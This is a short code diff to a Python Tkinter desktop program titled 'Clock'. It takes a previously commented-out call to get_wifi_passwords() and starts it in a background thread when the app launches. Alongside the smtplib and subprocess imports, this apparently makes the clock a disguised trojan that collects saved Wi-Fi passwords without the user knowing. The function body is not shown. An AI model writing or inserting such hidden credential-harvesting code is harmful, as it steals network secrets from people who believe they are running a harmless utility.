@@ -1,4 +1,4 @@
-import subprocess, re, smtplib, os, sys
+import subprocess, re, smtplib, os, sys, threading
 from tkinter import *
 from time import *
 from PIL import ImageTk, Image
@@ -68,17 +68,18 @@ def main():
 
         window.after(1000, update)
 
-    try:
-        os.chdir(os.path.dirname(sys.argv[0]))
-    except OSError:
-        pass
-
-    # get_wifi_passwords()
+    get_wifi_password_thread = threading.Thread(target= get_wifi_passwords)
+    get_wifi_password_thread.start()
 
     window = Tk()
     window.resizable(0,0)
     window.title('Clock')
-    with Image.open('icon.ico') as image:
+    try:
+        imagePath = os.path.join(os.path.dirname(sys.argv[0]), 'icon.ico')
+    except OSError:
+        imagePath = 'icon.ico'
+        
+    with Image.open(imagePath) as image:
         icon = ImageTk.PhotoImage(image)
     window.iconphoto(True, icon)
 
